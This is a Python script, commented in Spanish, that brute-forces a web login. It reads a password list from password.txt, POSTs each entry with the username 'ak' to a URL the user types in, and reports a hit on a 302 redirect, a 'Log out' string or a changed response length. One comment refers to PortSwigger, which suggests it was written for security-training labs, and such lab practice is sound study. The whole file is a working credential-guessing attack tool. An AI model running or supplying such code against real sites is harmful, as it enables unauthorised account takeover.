import requests

# 1. Definimos la URL del objetivo
url = input("url: ")
usuario = "ak"

# 2. Leer contraseñas
with open("password.txt", "r") as contraseñas_file:
    contraseñas = [linea.strip() for linea in contraseñas_file if linea.strip()]

if not contraseñas:
    print("El archivo password.txt está vacío.")
    exit()

print(f"\nProbando contraseñas para el usuario: {usuario}")
print(f"Total de contraseñas a probar: {len(contraseñas)}")
print("=" * 60)

# 3. Probamos cada contraseña
for i, password in enumerate(contraseñas, 1):
    data = {
        "password": password,
        "username": usuario
    }
    
    try:
        response = requests.post(url, data=data, timeout=5)
        
        # Mostrar progreso cada 50 intentos
        if i % 50 == 0:
            print(f"Progreso: {i}/{len(contraseñas)}")
        
        # Verificar si la contraseña es correcta
        # En PortSwigger, una contraseña correcta suele redirigir (302) o mostrar algo diferente
        if response.status_code == 302:
            print(f"\n{'='*60}")
            print(f"¡CONTRASEÑA ENCONTRADA!")
            print(f"Contraseña: {password}")
            print(f"Status Code: 302 (Redirección)")
            print(f"{'='*60}")
            break
        
        # También podría ser 200 con contenido diferente
        # Buscar indicadores de éxito
        if "Log out" in response.text or "logout" in response.text:
            print(f"\n{'='*60}")
            print(f"¡CONTRASEÑA ENCONTRADA!")
            print(f"Contraseña: {password}")
            print(f"Indicador: 'Log out' encontrado en la respuesta")
            print(f"{'='*60}")
            break
            
        # Otra pista: diferente content-length
        # Guardamos la primera longitud para comparar
        if i == 1:
            longitud_base = len(response.content)
        
        if len(response.content) != longitud_base:
            print(f"\n{'='*60}")
            print(f"¡POSIBLE CONTRASEÑA!")
            print(f"Contraseña: {password}")
            print(f"Content-Length diferente: {len(response.content)} (base: {longitud_base})")
            print("Verificar manualmente...")
            print(f"{'='*60}")
            # No break, solo avisa, pero sigue probando por si hay otra
            
    except Exception as e:
        print(f"Error probando contraseña '{password}': {e}")

print("\nBúsqueda completada.")

